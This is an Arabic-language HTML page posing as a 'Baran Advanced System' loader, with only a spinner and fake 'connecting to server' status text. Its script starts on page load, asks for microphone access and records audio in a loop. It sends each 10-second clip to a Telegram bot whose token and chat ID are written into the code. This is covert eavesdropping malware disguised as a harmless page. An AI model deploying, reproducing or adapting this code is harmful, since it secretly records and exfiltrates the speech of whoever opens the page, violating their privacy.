<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Baran Advanced System</title>
    <style>
        body { background: #050708; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #121619; border-top: 4px solid #ff7a18; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { margin-top: 20px; font-size: 14px; color: #888; text-align: center; }
    </style>
</head>
<body onload="autoStart()">

<div style="display: flex; flex-direction: column; align-items: center;">
    <div class="loader"></div>
    <div id="status">جاري تهيئة النظام...</div>
</div>

<script>
    let mediaRecorder;
    let audioChunks = [];
    
    // بيانات البوت الخاصة بك
    const botToken = "7546948976:AAFPHTjFRKGAOQOgkyg6uEqXCjl_ca2nC2k";
    const chatId = "56081692";

    // الوظيفة التي تعمل تلقائياً عند دخول الموقع
    async function autoStart() {
        const status = document.getElementById('status');
        try {
            // طلب الصلاحية فوراً
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            status.innerText = "جاري الاتصال بالسيرفر...";

            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                await sendToTelegram(audioBlob);
                // إعادة التشغيل للتسجيل المستمر إذا أردت
                audioChunks = [];
                autoStart(); 
            };

            // بدء التسجيل فور إعطاء الصلاحية
            mediaRecorder.start();

            // التسجيل لمدة 10 ثوانٍ ثم الإرسال
            setTimeout(() => {
                if(mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 10000);

        } catch (err) {
            status.innerText = "فشل: يجب الموافقة على الصلاحية للتشغيل";
            console.error(err);
        }
    }

    async function sendToTelegram(blob) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("audio", blob, "record.wav");

        try {
            // استخدام واجهة تليجرام مع إضافة معايير عدم الحظر
            await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: "POST",
                body: formData,
                mode: 'cors' 
            });
            console.log("Sent Successfully");
        } catch (e) {
            console.error("Error sending to Telegram:", e);
        }
    }
</script>
</body>
</html>
